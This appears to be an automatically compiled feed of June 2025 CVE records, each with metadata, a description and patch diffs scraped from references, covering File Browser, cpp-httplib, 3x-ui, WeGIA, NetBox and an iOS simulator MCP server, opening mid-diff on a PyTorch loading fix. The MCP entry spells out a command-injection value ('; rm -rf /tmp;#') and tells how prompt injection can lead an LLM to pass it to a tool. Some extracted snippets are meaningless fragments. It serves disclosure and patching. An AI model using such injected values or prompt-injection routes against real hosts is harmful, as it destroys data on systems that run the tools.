 src/llamafactory/train/callbacks.py             | 2 +-
 2 files changed, 2 insertions(+), 2 deletions(-)

diff --git a/src/llamafactory/model/model_utils/valuehead.py b/src/llamafactory/model/model_utils/valuehead.py
index 137c6b7d0f..7409a22edd 100644
--- a/src/llamafactory/model/model_utils/valuehead.py
+++ b/src/llamafactory/model/model_utils/valuehead.py
@@ -49,7 +49,7 @@ def load_valuehead_params(path_or_repo_id: str, model_args: "ModelArguments") ->
 
     try:
         vhead_file = cached_file(filename=V_HEAD_WEIGHTS_NAME, **kwargs)
-        return torch.load(vhead_file, map_location="cpu")
+        return torch.load(vhead_file, map_location="cpu", weights_only=True)
     except Exception as err:
         err_text = str(err)
 
diff --git a/src/llamafactory/train/callbacks.py b/src/llamafactory/train/callbacks.py
index c1bd1599f5..3e351c0f44 100644
--- a/src/llamafactory/train/callbacks.py
+++ b/src/llamafactory/train/callbacks.py
@@ -76,7 +76,7 @@ def fix_valuehead_checkpoint(
             state_dict: dict[str, torch.Tensor] = {key: f.get_tensor(key) for key in f.keys()}
     else:
         path_to_checkpoint = os.path.join(output_dir, WEIGHTS_NAME)
-        state_dict: dict[str, torch.Tensor] = torch.load(path_to_checkpoint, map_location="cpu")
+        state_dict: dict[str, torch.Tensor] = torch.load(path_to_checkpoint, map_location="cpu", weights_only=True)
 
     os.remove(path_to_checkpoint)
     decoder_state_dict, v_head_state_dict = {}, {}


================================================================================


CVE ID: CVE-2025-52902
Published: 2025-06-26T15:15:23.687
Modified: 2025-07-10T01:09:35.847
CVSS Score: 7.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-80: CWE-80

Description:
File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. The Markdown preview function of File Browser prior to v2.33.7 is vulnerable to Stored Cross-Site-Scripting (XSS). Any JavaScript code that is part of a Markdown file uploaded by a user will be executed by the browser. Version 2.33.7 contains a fix for the issue.

References (2):
  1. https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d [Patch]
  2. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97 [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d ---
From f19943a42e8e092e811dffbe9f4623dac36f1f0d Mon Sep 17 00:00:00 2001
From: Henrique Dias <mail@hacdias.com>
Date: Wed, 25 Jun 2025 17:35:15 +0200
Subject: [PATCH] Merge commit from fork

---
 frontend/package.json               |  1 +
 frontend/pnpm-lock.yaml             | 30 ++++++++++++++++++++++-------
 frontend/src/views/files/Editor.vue |  3 ++-
 3 files changed, 26 insertions(+), 8 deletions(-)

diff --git a/frontend/package.json b/frontend/package.json
index 78951c4b4a..e09558c72f 100644
--- a/frontend/package.json
+++ b/frontend/package.json
@@ -24,6 +24,7 @@
     "ace-builds": "^1.37.5",
     "core-js": "^3.40.0",
     "dayjs": "^1.11.10",
+    "dompurify": "^3.2.6",
     "epubjs": "^0.3.93",
     "filesize": "^10.1.1",
     "js-base64": "^3.7.7",
diff --git a/frontend/pnpm-lock.yaml b/frontend/pnpm-lock.yaml
index d9d19749ed..6614251467 100644
--- a/frontend/pnpm-lock.yaml
+++ b/frontend/pnpm-lock.yaml
@@ -26,6 +26,9 @@ importers:
       dayjs:
         specifier: ^1.11.10
         version: 1.11.13
+      dompurify:
+        specifier: ^3.2.6
+        version: 3.2.6
       epubjs:
         specifier: ^0.3.93
         version: 0.3.93
@@ -946,8 +949,8 @@ packages:
     resolution: {integrity: sha512-dF2iMMy8P9uKVHV/20LA1ulFLL+MKSbfMiixSmn6fpwqzvix38OIc7ebgnFbBqElvghZCW9ACtzKTGKsTGTWGA==}
     engines: {node: '>= 16'}
 
-  '@intlify/shared@11.1.3':
-    resolution: {integrity: sha512-pTFBgqa/99JRA2H1qfyqv97MKWJrYngXBA/I0elZcYxvJgcCw3mApAoPW3mJ7vx3j+Ti0FyKUFZ4hWxdjKaxvA==}
+  '@intlify/shared@11.1.7':
+    resolution: {integrity: sha512-4yZeMt2Aa/7n5Ehy4KalUlvt3iRLcg1tq9IBVfOgkyWFArN4oygn6WxgGIFibP3svpaH8DarbNaottq+p0gUZQ==}
     engines: {node: '>= 16'}
 
   '@intlify/shared@12.0.0-alpha.2':
@@ -1174,6 +1177,9 @@ packages:
   '@types/node@22.10.10':
     resolution: {integrity: sha512-X47y/mPNzxviAGY5TcYPtYL8JsY3kAq2n8fMmKoRCxq/c4v4pyGNCzM2R6+M5/umG4ZfHuT+sgqDYqWc9rJ6ww==}
 
+  '@types/trusted-types@2.0.7':
+    resolution: {integrity: sha512-ScaPdn1dQczgbl0QFTeTOmVHFULt394XJgOQNoyVhZ6r2vLnMLJfBPd53SB52T/3G36VI1/g2MZaX0cwDuXsfw==}
+
   '@types/web-bluetooth@0.0.20':
     resolution: {integrity: sha512-g9gZnnXVq7gM7v3tJCWV/qw7w+KeOlSHAhgF9RytFyifW6AF61hdT2ucrYhPq9hLs5JIryeupHV3qGk95dH9ow==}
 
@@ -1602,6 +1608,9 @@ packages:
   dom-walk@0.1.2:
     resolution: {integrity: sha512-6QvTW9mrGeIegrFXdtQi9pk7O/nSK6lSdXW2eqUspN5LWD7UTji2Fqw5V2YLjBpHEoU9Xl/eUWNpDeZvoyOv2w==}
 
+  dompurify@3.2.6:
+    resolution: {integrity: sha512-/2GogDQlohXPZe6D6NOgQvXLPSYBqIWMnZ8zzOhn09REE4eyAzb+Hed3jhoM9OkuaJ8P6ZGTTVWQKAi8ieIzfQ==}
+
   electron-to-chromium@1.5.67:
     resolution: {integrity: sha512-nz88NNBsD7kQSAGGJyp8hS6xSPtWwqNogA0mjtc2nUYeEf3nURK9qpV18TuBdDmEDgVWotS8Wkzf+V52dSQ/LQ==}
 
@@ -3628,7 +3637,7 @@ snapshots:
 
   '@intlify/shared@11.1.2': {}
 
-  '@intlify/shared@11.1.3': {}
+  '@intlify/shared@11.1.7': {}
 
   '@intlify/shared@12.0.0-alpha.2': {}
 
@@ -3636,8 +3645,8 @@ snapshots:
     dependencies:
       '@eslint-community/eslint-utils': 4.4.1(eslint@9.19.0)
       '@intlify/bundle-utils': 10.0.0(vue-i18n@11.1.2(vue@3.5.13(typescript@5.6.3)))
-      '@intlify/shared': 11.1.3
-      '@intlify/vue-i18n-extensions': 8.0.0(@intlify/shared@11.1.3)(@vue/compiler-dom@3.5.13)(vue-i18n@11.1.2(vue@3.5.13(typescript@5.6.3)))(vue@3.5.13(typescript@5.6.3))
+      '@intlify/shared': 11.1.7
+      '@intlify/vue-i18n-extensions': 8.0.0(@intlify/shared@11.1.7)(@vue/compiler-dom@3.5.13)(vue-i18n@11.1.2(vue@3.5.13(typescript@5.6.3)))(vue@3.5.13(typescript@5.6.3))
       '@rollup/pluginutils': 5.1.4(rollup@4.40.1)
       '@typescript-eslint/scope-manager': 8.21.0
       '@typescript-eslint/typescript-estree': 8.21.0(typescript@5.6.3)
@@ -3659,11 +3668,11 @@ snapshots:
       - supports-color
       - typescript
 
-  '@intlify/vue-i18n-extensions@8.0.0(@intlify/shared@11.1.3)(@vue/compiler-dom@3.5.13)(vue-i18n@11.1.2(vue@3.5.13(typescript@5.6.3)))(vue@3.5.13(typescript@5.6.3))':
+  '@intlify/vue-i18n-extensions@8.0.0(@intlify/shared@11.1.7)(@vue/compiler-dom@3.5.13)(vue-i18n@11.1.2(vue@3.5.13(typescript@5.6.3)))(vue@3.5.13(typescript@5.6.3))':
     dependencies:
       '@babel/parser': 7.26.7
     optionalDependencies:
-      '@intlify/shared': 11.1.3
+      '@intlify/shared': 11.1.7
       '@vue/compiler-dom': 3.5.13
       vue: 3.5.13(typescript@5.6.3)
       vue-i18n: 11.1.2(vue@3.5.13(typescript@5.6.3))
@@ -3812,6 +3821,9 @@ snapshots:
     dependencies:
       undici-types: 6.20.0
 
+  '@types/trusted-types@2.0.7':
+    optional: true
+
   '@types/web-bluetooth@0.0.20': {}
 
   '@typescript-eslint/eslint-plugin@8.21.0(@typescript-eslint/parser@8.21.0(eslint@9.19.0)(typescript@5.6.3))(eslint@9.19.0)(typescript@5.6.3)':
@@ -4282,6 +4294,10 @@ snapshots:
 
   dom-walk@0.1.2: {}
 
+  dompurify@3.2.6:
+    optionalDependencies:
+      '@types/trusted-types': 2.0.7
+
   electron-to-chromium@1.5.67: {}
 
   emoji-regex@8.0.0: {}
diff --git a/frontend/src/views/files/Editor.vue b/frontend/src/views/files/Editor.vue
index 9e9b6b68af..d78e6afe73 100644
--- a/frontend/src/views/files/Editor.vue
+++ b/frontend/src/views/files/Editor.vue
@@ -41,6 +41,7 @@ import url from "@/utils/url";
 import ace, { Ace, version as ace_version } from "ace-builds";
 import modelist from "ace-builds/src-noconflict/ext-modelist";
 import "ace-builds/src-noconflict/ext-language_tools";
+import DOMPurify from "dompurify";
 
 import HeaderBar from "@/components/header/HeaderBar.vue";
 import Action from "@/components/header/Action.vue";
@@ -83,7 +84,7 @@ onMounted(() => {
     if (isMarkdownFile && isPreview.value) {
       const new_value = editor.value?.getValue() || "";
       try {
-        previewContent.value = await marked(new_value);
+        previewContent.value = DOMPurify.sanitize(await marked(new_value));
       } catch (error) {
         console.error("Failed to convert content to HTML:", error);
         previewContent.value = "";


================================================================================


CVE ID: CVE-2025-52900
Published: 2025-06-26T15:15:23.520
Modified: 2025-07-10T01:17:03.443
CVSS Score: 5.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-276: Incorrect Default Permissions

Description:
File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. The file access permissions for files uploaded to or created from File Browser are never explicitly set by the application. The same is true for the database used by File Browser. On standard servers using File Browser prior to version 2.33.7 where the umask configuration has not been hardened before, this makes all the stated files readable by any operating system account. Version 2.33.7 fixes the issue.

References (2):
  1. https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76 [Patch]
  2. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jj2r-455p-5gvf [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/filebrowser/filebrowser/commit/ca86f916216620365c0f81629c0934ce02574d76 ---
From ca86f916216620365c0f81629c0934ce02574d76 Mon Sep 17 00:00:00 2001
From: Henrique Dias <mail@hacdias.com>
Date: Wed, 25 Jun 2025 17:42:39 +0200
Subject: [PATCH] Merge commit from fork

---
 cmd/utils.go  | 3 ++-
 files/file.go | 4 ++--
 2 files changed, 4 insertions(+), 3 deletions(-)

diff --git a/cmd/utils.go b/cmd/utils.go
index 49cc2d2fbc..22a7cdac24 100644
--- a/cmd/utils.go
+++ b/cmd/utils.go
@@ -14,6 +14,7 @@ import (
 	"github.com/spf13/pflag"
 	yaml "gopkg.in/yaml.v2"
 
+	"github.com/filebrowser/filebrowser/v2/files"
 	"github.com/filebrowser/filebrowser/v2/settings"
 	"github.com/filebrowser/filebrowser/v2/storage"
 	"github.com/filebrowser/filebrowser/v2/storage/bolt"
@@ -105,7 +106,7 @@ func python(fn pythonFunc, cfg pythonConfig) cobraFunc {
 
 		log.Println("Using database: " + absPath)
 		data.hadDB = exists
-		db, err := storm.Open(path)
+		db, err := storm.Open(path, storm.BoltOptions(files.PermFile, nil))
 		checkErr(err)
 		defer db.Close()
 		data.store, err = bolt.NewStorage(db)
diff --git a/files/file.go b/files/file.go
index 03b3a6f98b..1bd366f2ec 100644
--- a/files/file.go
+++ b/files/file.go
@@ -27,8 +27,8 @@ import (
 	"github.com/filebrowser/filebrowser/v2/rules"
 )
 
-const PermFile = 0644
-const PermDir = 0755
+const PermFile = 0640
+const PermDir = 0750
 
 var (
 	reSubDirs = regexp.MustCompile("(?i)^sub(s|titles)$")


================================================================================


CVE ID: CVE-2025-52887
Published: 2025-06-26T15:15:23.350
Modified: 2025-08-06T19:15:01.753
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-400: Uncontrolled Resource Consumption

Description:
cpp-httplib is a C++11 single-file header-only cross platform HTTP/HTTPS library. In version 0.21.0, when many http headers fields are passed in, the library does not limit the number of headers, and the memory associated with the headers will not be released when the connection is disconnected. This leads to potential exhaustion of system memory and results in a server crash or unresponsiveness. Version 0.22.0 contains a patch for the issue.

References (2):
  1. https://github.com/yhirose/cpp-httplib/commit/28dcf379e82a2cdb544d812696a7fd46067eb7f9 [Patch]
  2. https://github.com/yhirose/cpp-httplib/security/advisories/GHSA-xjhg-gf59-p92h [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/yhirose/cpp-httplib/commit/28dcf379e82a2cdb544d812696a7fd46067eb7f9 ---
From 28dcf379e82a2cdb544d812696a7fd46067eb7f9 Mon Sep 17 00:00:00 2001
From: yhirose <yhirose@users.noreply.github.com>
Date: Tue, 24 Jun 2025 07:56:00 -0400
Subject: [PATCH] Merge commit from fork

---
 httplib.h    | 17 ++++++++++++
 test/test.cc | 74 ++++++++++++++++++++++++++++++++++++++++++++++++++++
 2 files changed, 91 insertions(+)

diff --git a/httplib.h b/httplib.h
index a5518aea1c..b1694cf722 100644
--- a/httplib.h
+++ b/httplib.h
@@ -90,6 +90,10 @@
 #define CPPHTTPLIB_HEADER_MAX_LENGTH 8192
 #endif
 
+#ifndef CPPHTTPLIB_HEADER_MAX_COUNT
+#define CPPHTTPLIB_HEADER_MAX_COUNT 100
+#endif
+
 #ifndef CPPHTTPLIB_REDIRECT_MAX_COUNT
 #define CPPHTTPLIB_REDIRECT_MAX_COUNT 20
 #endif
@@ -4355,6 +4359,8 @@ inline bool read_headers(Stream &strm, Headers &headers) {
   char buf[bufsiz];
   stream_line_reader line_reader(strm, buf, bufsiz);
 
+  size_t header_count = 0;
+
   for (;;) {
     if (!line_reader.getline()) { return false; }
 
@@ -4375,6 +4381,9 @@ inline bool read_headers(Stream &strm, Headers &headers) {
 
     if (line_reader.size() > CPPHTTPLIB_HEADER_MAX_LENGTH) { return false; }
 
+    // Check header count limit
+    if (header_count >= CPPHTTPLIB_HEADER_MAX_COUNT) { return false; }
+
     // Exclude line terminator
     auto end = line_reader.ptr() + line_reader.size() - line_terminator_len;
 
@@ -4384,6 +4393,8 @@ inline bool read_headers(Stream &strm, Headers &headers) {
                       })) {
       return false;
     }
+
+    header_count++;
   }
 
   return true;
@@ -4486,9 +4497,13 @@ inline bool read_content_chunked(Stream &strm, T &x,
   // chunked transfer coding data without the final CRLF.
   if (!line_reader.getline()) { return true; }
 
+  size_t trailer_header_count = 0;
   while (strcmp(line_reader.ptr(), "\r\n") != 0) {
     if (line_reader.size() > CPPHTTPLIB_HEADER_MAX_LENGTH) { return false; }
 
+    // Check trailer header count limit
+    if (trailer_header_count >= CPPHTTPLIB_HEADER_MAX_COUNT) { return false; }
+
     // Exclude line terminator
     constexpr auto line_terminator_len = 2;
     auto end = line_reader.ptr() + line_reader.size() - line_terminator_len;
@@ -4498,6 +4513,8 @@ inline bool read_content_chunked(Stream &strm, T &x,
                    x.headers.emplace(key, val);
                  });
 
+    trailer_header_count++;
+
     if (!line_reader.getline()) { return false; }
   }
 
diff --git a/test/test.cc b/test/test.cc
index 3185906b08..df52529536 100644
--- a/test/test.cc
+++ b/test/test.cc
@@ -3,7 +3,11 @@
 #include <signal.h>
 
 #ifndef _WIN32
+#include <arpa/inet.h>
 #include <curl/curl.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <unistd.h>
 #endif
 #include <gtest/gtest.h>
 
@@ -3823,6 +3827,50 @@ TEST_F(ServerTest, TooLongHeader) {
   EXPECT_EQ(StatusCode::OK_200, res->status);
 }
 
+TEST_F(ServerTest, HeaderCountAtLimit) {
+  // Test with headers just under the 100 limit
+  httplib::Headers headers;
+  
+  // Add 95 custom headers (the client will add Host, User-Agent, Accept, etc.)
+  // This should keep us just under the 100 header limit
+  for (int i = 0; i < 95; i++) {
+    std::string name = "X-Test-Header-" + std::to_string(i);
+    std::string value = "value" + std::to_string(i);
+    headers.emplace(name, value);
+  }
+  
+  // This should work fine as we're under the limit
+  auto res = cli_.Get("/hi", headers);
+  EXPECT_TRUE(res);
+  if (res) {
+    EXPECT_EQ(StatusCode::OK_200, res->status);
+  }
+}
+
+TEST_F(ServerTest, HeaderCountExceedsLimit) {
+  // Test with many headers to exceed the 100 limit
+  httplib::Headers headers;
+  
+  // Add 150 headers to definitely exceed the 100 limit
+  for (int i = 0; i < 150; i++) {
+    std::string name = "X-Test-Header-" + std::to_string(i);
+    std::string value = "value" + std::to_string(i);
+    headers.emplace(name, value);
+  }
+  
+  // This should fail due to exceeding header count limit
+  auto res = cli_.Get("/hi", headers);
+  
+  // The request should either fail or return 400 Bad Request
+  if (res) {
+    // If we get a response, it should be 400 Bad Request
+    EXPECT_EQ(StatusCode::BadRequest_400, res->status);
+  } else {
+    // Or the request should fail entirely
+    EXPECT_FALSE(res);
+  }
+}
+
 TEST_F(ServerTest, PercentEncoding) {
   auto res = cli_.Get("/e%6edwith%");
   ASSERT_TRUE(res);
@@ -3860,6 +3908,32 @@ TEST_F(ServerTest, PlusSignEncoding) {
   EXPECT_EQ("a +b", res->body);
 }
 
+TEST_F(ServerTest, HeaderCountSecurityTest) {
+  // This test simulates a potential DoS attack using many headers
+  // to verify our security fix prevents memory exhaustion
+  
+  httplib::Headers attack_headers;
+  
+  // Attempt to add many headers like an attacker would (200 headers to far exceed limit)
+  for (int i = 0; i < 200; i++) {
+    std::string name = "X-Attack-Header-" + std::to_string(i);
+    std::string value = "attack_payload_" + std::to_string(i);
+    attack_headers.emplace(name, value);
+  }
+  
+  // Try to POST with excessive headers
+  auto res = cli_.Post("/", attack_headers, "test_data", "text/plain");
+  
+  // Should either fail or return 400 Bad Request due to security limit
+  if (res) {
+    // If we get a response, it should be 400 Bad Request
+    EXPECT_EQ(StatusCode::BadRequest_400, res->status);
+  } else {
+    // Request failed, which is the expected behavior for DoS protection
+    EXPECT_FALSE(res);
+  }
+}
+
 TEST_F(ServerTest, MultipartFormData) {
   MultipartFormDataItems items = {
       {"text1", "text default", "", ""},


================================================================================


CVE ID: CVE-2025-29331
Published: 2025-06-26T15:15:22.690
Modified: 2025-07-10T14:49:40.977
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-295: Improper Certificate Validation

Description:
An issue in MHSanaei 3x-ui before v.2.5.3 and before allows a remote attacker to execute arbitrary code via the management script x-ui passes the no check certificate option to wget when downloading updates

References (2):
  1. https://github.com/MHSanaei/3x-ui/pull/2661 [Exploit, Issue Tracking, Patch]
  2. https://www.digilol.net/security-advisories/dlsec2025-001.html [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.digilol.net/security-advisories/dlsec2025-001.html ---
<!--[-->--no-check-certificate<!--]-->

================================================================================


CVE ID: CVE-2024-56915
Published: 2025-06-26T15:15:22.570
Modified: 2025-06-30T14:44:36.367
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Netbox Community v4.1.7 and fixed in v.4.2.2 is vulnerable to Cross Site Scripting (XSS) via the RSS feed widget.

References (3):
  1. https://github.com/netbox-community/netbox/releases/tag/v4.1.7 [Release Notes]
  2. https://github.com/noxlumens/Vulnerability-Research/tree/main/CVE-2024-56915 [Exploit, Third Party Advisory]
  3. https://youtu.be/n_5w0WVP8zE [Exploit]

Attempting to extract code examples from references...

--- Code from https://github.com/netbox-community/netbox/releases/tag/v4.1.7 ---
name

LOGIN_REQUIRED

to_grams()

================================================================================


CVE ID: CVE-2025-6695
Published: 2025-06-26T14:15:34.967
Modified: 2025-07-01T18:18:08.297
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability was found in LabRedesCefetRJ WeGIA 3.4.0 and classified as problematic. This issue affects some unknown processing of the file /html/matPat/adicionar_categoria.php of the component Additional Categoria. The manipulation of the argument Insira a nova categoria leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README2.md [Broken Link]
  2. https://vuldb.com/?ctiid.313961 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313961 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597071 [Exploit, Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.597071 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313961 ---
Insira a nova categoria

================================================================================


CVE ID: CVE-2025-6694
Published: 2025-06-26T14:15:34.777
Modified: 2025-07-01T19:03:59.900
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability has been found in LabRedesCefetRJ WeGIA 3.4.0 and classified as problematic. This vulnerability affects unknown code of the file /html/matPat/adicionar_unidade.php of the component Adicionar Unidade. The manipulation of the argument Insira a nova unidade leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/RaulPazemecxas/PoCVulDb [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313960 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313960 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.595343 [Exploit, Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.595343 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313960 ---
Insira a nova unidade

================================================================================


CVE ID: CVE-2025-52573
Published: 2025-06-26T14:15:30.577
Modified: 2025-06-26T18:57:43.670
CVSS Score: 6.0 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:H

CWE Categories:
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
iOS Simulator MCP Server (ios-simulator-mcp) is a Model Context Protocol (MCP) server for interacting with iOS simulators. Versions prior to 1.3.3 are written in a way that is vulnerable to command injection vulnerability attacks as part of some of its MCP Server tool definition and implementation. The MCP Server exposes the tool `ui_tap` which relies on Node.js child process API `exec` which is an unsafe and vulnerable API if concatenated with untrusted user input. LLM exposed user input for `duration`, `udid`, and `x` and `y` args can be replaced with shell meta-characters like `;` or `&&` or others to change the behavior from running the expected command `idb` to another command. When LLMs are tricked through prompt injection (and other techniques and attack vectors) to call the tool with input that uses special shell characters such as `; rm -rf /tmp;#` and other payload variations, the full command-line text will be interepted by the shell and result in other commands except of `ps` executing on the host running the MCP Server. Version 1.3.3 contains a patch for the issue.

References (4):
  1. https://github.com/joshuayoes/ios-simulator-mcp/blob/main/src/index.ts#L166-L207
  2. https://github.com/joshuayoes/ios-simulator-mcp/commit/eb53a4f2cc8bbeb13e8d6d930f00167befcdb809
  3. https://github.com/joshuayoes/ios-simulator-mcp/releases/tag/v1.3.3
  4. https://github.com/joshuayoes/ios-simulator-mcp/security/advisories/GHSA-6f6r-m9pv-67jw

Attempting to extract code examples from references...

--- Code from https://github.com/joshuayoes/ios-simulator-mcp/commit/eb53a4f2cc8bbeb13e8d6d930f00167befcdb809 ---
From 7615b636f6dc6448834cc34a28307393e1bea646 Mon Sep 17 00:00:00 2001
From: Joshua Yoes <37849890+joshuayoes@users.noreply.github.com>
Date: Mon, 16 Jun 2025 10:31:02 -0700
Subject: [PATCH 1/7] chore: add command injection protections, document in
 README.md and SECURITY.md

---
 README.md    |   2 +
 SECURITY.md  |  25 ++++++++--
 package.json |   2 +-
 src/index.ts | 130 ++++++++++++++++++++++++++++++++++++++++-----------
 4 files changed, 126 insertions(+), 33 deletions(-)

diff --git a/README.md b/README.md
index 6ee17f7..35bd789 100644
--- a/README.md
+++ b/README.md
@@ -4,6 +4,8 @@
 
 A Model Context Protocol (MCP) server for interacting with iOS simulators. This server allows you to interact with iOS simulators by getting information about them, controlling UI interactions, and inspecting UI elements.
 
+> **Security Notice**: Command injection vulnerabilities present in versions < 1.3.3 have been fixed. Please update to v1.3.3 or later. See [SECURITY.md](SECURITY.md) for details.
+
 <a href="https://glama.ai/mcp/servers/@joshuayoes/ios-simulator-mcp">
   <img width="380" height="200" src="https://glama.ai/mcp/servers/@joshuayoes/ios-simulator-mcp/badge" alt="iOS Simulator MCP server" />
 </a>
diff --git a/SECURITY.md b/SECURITY.md
index 2275b38..b59633a 100644
--- a/SECURITY.md
+++ b/SECURITY.md
@@ -5,9 +5,24 @@
 Use this section to tell people about which versions of your project are
 currently being supported with security updates.
 
-| Version | Supported          |
-| ------- | ------------------ |
-| *       | :white_check_mark: |
+| Version  | Supported          |
+| -------- | ------------------ |
+| >= 1.3.3 | :white_check_mark: |
+| < 1.3.3  | :x:                |
+
+## Fixed Vulnerabilities
+
+### Command Injection (Fixed in v1.3.3)
+
+**CVE**: To be assigned  
+**Severity**: High  
+**Fixed in**: v1.3.3 (2025)
+
+**Description**: Previous versions contained command injection vulnerabilities in several MCP tools (ui_tap, ui_type, ui_swipe, ui_describe_point, ui_describe_all, screenshot, record_video, stop_recording) due to unsafe shell command construction using string interpolation.
+
+**Impact**: Malicious input could potentially execute arbitrary commands on the host system.
+
+**Fix**: Replaced unsafe `execAsync` string interpolation with secure `execFile` calls using argument arrays. Added input validation.
 
 ## Reporting a Vulnerability
 
@@ -16,10 +31,12 @@ To report a security issue, please use the GitHub Security Advisory "Report a Vu
 You can expect an initial response to your report within 48 hours. We will keep you informed about the progress of addressing the vulnerability and will work with you to coordinate the disclosure timeline.
 
 If the vulnerability is accepted:
+
 - We will work on a fix and keep you updated on the progress
 - Once a fix is ready, we will coordinate with you on the disclosure timeline
 - You will be credited for the discovery (unless you prefer to remain anonymous)
 
 If the vulnerability is declined:
+
 - We will provide a detailed explanation of why it was not accepted
-- If appropriate, we will suggest alternative approaches or mitigations
\ No newline at end of file
+- If appropriate, we will suggest alternative approaches or mitigations
diff --git a/package.json b/package.json
index fcaf887..411c441 100644
--- a/package.json
+++ b/package.json
@@ -1,6 +1,6 @@
 {
   "name": "ios-simulator-mcp",
-  "version": "1.3.2",
+  "version": "1.3.3",
   "description": "MCP server for interacting with the iOS simulator",
   "bin": {
     "ios-simulator-mcp": "./build/index.js"
diff --git a/src/index.ts b/src/index.ts
index 7b3dc10..da329e3 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -2,13 +2,36 @@
 
 import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
 import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
-import { exec, spawn } from "child_process";
+import { execFile, spawn } from "child_process";
 import { promisify } from "util";
 import { z } from "zod";
 import path from "path";
 import os from "os";
 
-const execAsync = promisify(exec);
+const execFileAsync = promisify(execFile);
+
+/**
+ * Strict UDID/UUID pattern: 8-4-4-4-12 hexadecimal characters (e.g. 37A360EC-75F9-4AEC-8EFA-10F4A58D8CCA)
+ */
+const UDID_REGEX =
+  /^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$/;
+
+/**
+ * Runs a command with arguments and returns the stdout and stderr
+ * @param cmd - The command to run
+ * @param args - The arguments to pass to the command
+ * @returns The stdout and stderr of the command
+ */
+async function run(
+  cmd: string,
+  args: string[]
+): Promise<{ stdout: string; stderr: string }> {
+  const { stdout, stderr } = await execFileAsync(cmd, args, { shell: false });
+  return {
+    stdout: stdout.trim(),
+    stderr: stderr.trim(),
+  };
+}
 
 // Read filtered tools from environment variable
 const FILTERED_TOOLS =
@@ -49,7 +72,7 @@ function errorWithTroubleshooting(message: string): string {
 }
 
 async function getBootedDevice() {
-  const { stdout, stderr } = await execAsync("xcrun simctl list devices");
+  const { stdout, stderr } = await run("xcrun", ["simctl", "list", "devices"]);
 
   if (stderr) throw new Error(stderr);
 
@@ -130,6 +153,7 @@ if (!isToolFiltered("ui_describe_all")) {
     {
       udid: z
         .string()
+        .regex(UDID_REGEX)
         .optional()
         .describe("Udid of target, can also be set with the IDB_UDID env var"),
     },
@@ -137,9 +161,14 @@ if (!isToolFiltered("ui_describe_all")) {
       try {
         const actualUdid = await getBootedDeviceId(udid);
 
-        const { stdout } = await execAsync(
-          `idb ui describe-all --udid ${actualUdid} --json --nested`
-        );
+        const { stdout } = await run("idb", [
+          "ui",
+          "describe-all",
